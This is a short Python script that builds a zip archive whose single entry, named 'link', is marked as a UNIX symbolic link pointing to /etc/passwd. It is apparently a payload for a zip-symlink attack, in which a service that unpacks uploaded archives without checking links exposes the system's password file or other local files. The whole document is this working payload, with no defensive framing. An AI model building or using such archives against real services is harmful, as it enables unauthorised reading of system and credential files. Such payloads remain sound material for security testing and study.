import zipfile
import os

with zipfile.ZipFile('symlink.zip', 'w') as z:
    info = zipfile.ZipInfo('link')
    info.create_system = 3 # UNIX
    info.external_attr = 0o120777 << 16 # symlink
    z.writestr(info, '/etc/passwd')
